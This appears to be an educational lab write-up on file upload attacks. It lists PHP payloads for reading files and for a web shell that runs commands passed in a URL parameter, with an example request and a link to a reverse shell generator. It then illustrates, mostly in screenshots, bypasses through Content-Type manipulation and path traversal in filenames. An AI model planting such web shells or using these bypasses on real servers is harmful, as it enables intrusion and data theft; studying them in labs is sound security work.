<h1>Payloads - FOR EDUCATIONAL PURPOSES ONLY</h1>

<h2>PHP</h2>

**File Retrieval**

```<?php echo file_get_contents('/path/to/file'); ?>```

**Dynamic Web Shell**

```<?php echo system($_GET['command']); ?>```


Use the shell like this ```GET /example/exploit.php?command=id HTTP/1.1```

**Reverse Shell**

See https://www.revshells.com for a reverse shell generator

<h1>Proof Of Concepts - FOR EDUCATIONAL PURPOSES ONLY</h1>

Various proof of concepts for file upload attacks. All data is from a lab environment.

<h2>No Protections</h2>

In this lab environment, there are no protections against file upload attacks. We are able to upload a php web shell and achieve remote code execution by requesting the file.

<img width="1413" height="600" alt="file-upload-no-protections-1" src="https://github.com/user-attachments/assets/aa9ed633-d369-41cd-865b-a4587a031aaf" />

<img width="1421" height="605" alt="file-upload-no-protections-2" src="https://github.com/user-attachments/assets/17df9a2a-c346-4e0c-b5ce-c943eb4b07a0" />

<h2>Bypass File-Type Allow List - Request Manipulation</h2>

If the server only allows certain file types, sometimes you can bypass this restriction by manipulating the Content-Type

<img width="1417" height="601" alt="file-upload-content-type-manipulation-failed-upload" src="https://github.com/user-attachments/assets/c90a9861-09da-4be3-aaed-ab1f2da82c26" />

<img width="1415" height="601" alt="file-upload-content-type-manipulation-successful-upload" src="https://github.com/user-attachments/assets/a8ebf1e7-5429-4363-b9dc-b9812bb9af2f" />

<img width="1415" height="600" alt="file-upload-content-type-manipulation-successful-command-execution" src="https://github.com/user-attachments/assets/dfff27e2-3533-43a5-8b0c-094b8400ffbc" />

<h2>Uploaded Files Served As Plain Text</h2>

Sometimes the server might serve your uploaded file as plain text in an attempt to protect the server against file upload attacks. The upload directory has strict security, but we might be able to upload our file to a
different directory via a path traversal in the filename.

<h3>Uploaded Files Served As Plain Text</h3>

<img width="1415" height="601" alt="uploaded-files-served-as-plain-text-1" src="https://github.com/user-attachments/assets/f66c4652-5c71-431f-bfc5-9ec6d5057b67" />

<img width="1419" height="602" alt="uploaded-files-served-as-plain-text-2" src="https://github.com/user-attachments/assets/dc626f5a-fb5e-415b-b0c2-21d352da7966" />

<h3>Bypassed By Using Path Traversal To Upload Files To Different Directory</h3>

<img width="1414" height="605" alt="path-traversal-to-upload-file-to-different-directory-1" src="https://github.com/user-attachments/assets/1597436b-7da1-451d-b8f2-7b761bb38ab6" />

<img width="1417" height="603" alt="path-traversal-to-upload-file-to-different-directory-2" src="https://github.com/user-attachments/assets/d909ade1-406f-461c-a26f-ef52ab4e32cd" />












